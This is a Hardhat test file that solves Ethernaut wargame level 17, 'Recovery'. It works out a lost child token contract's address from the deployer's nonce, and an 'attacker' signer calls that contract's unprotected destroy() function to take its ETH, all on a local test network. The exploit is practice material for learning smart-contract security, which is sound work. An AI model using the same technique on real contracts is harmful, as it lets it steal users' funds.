import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Recovery, SimpleToken} from '../../types/typechain';

describe('Ethernaut 17: Recovery', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Recovery;
  let childContract: SimpleToken;

  const CONTRACT_BALANCE = ethers.utils.parseEther('0.01');
  const SIMPLE_TOKEN_SUPPLY = ethers.utils.parseEther('10');
  const SIMPLE_TOKEN_NAME = 'SIMPL';

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Recovery', owner).then(f => f.deploy());
    await contract.deployed();

    // generate token
    await contract.generateToken(SIMPLE_TOKEN_NAME, SIMPLE_TOKEN_SUPPLY);

    // deployed child contract address
    const childContractAddress = ethers.utils.getContractAddress({
      from: contract.address,
      nonce: 1,
    });
    expect(childContractAddress).to.be.properAddress;
    childContract = await ethers.getContractFactory('SimpleToken', owner).then(f => f.attach(childContractAddress));
    expect(await ethers.provider.getCode(childContract.address)).to.not.eq('0x');
    expect(await childContract.balances(owner.address)).to.eq(SIMPLE_TOKEN_SUPPLY);

    // owner sends some ETH
    await owner.sendTransaction({
      to: childContract.address,
      value: CONTRACT_BALANCE,
    });
    expect(await ethers.provider.getBalance(childContract.address)).to.eq(CONTRACT_BALANCE);

    // sending ETH actually overwrites the balance, which sucks hahah
    expect(await childContract.balances(owner.address)).to.eq(CONTRACT_BALANCE.mul(10));
  });

  it('should recover the tokens', async () => {
    // attacker calculates the address on their own too :)
    const childContractAddress = ethers.utils.getContractAddress({
      from: contract.address,
      nonce: 1,
    });
    expect(childContractAddress).to.be.properAddress;

    // attacker calls destroy
    const childContract = await ethers
      .getContractFactory('SimpleToken', attacker)
      .then(f => f.attach(childContractAddress));
    await childContract.destroy(attacker.address);
  });

  after(async () => {
    expect(await ethers.provider.getCode(childContract.address)).to.eq('0x');
    expect(await ethers.provider.getBalance(childContract.address)).to.eq(0);
  });
});
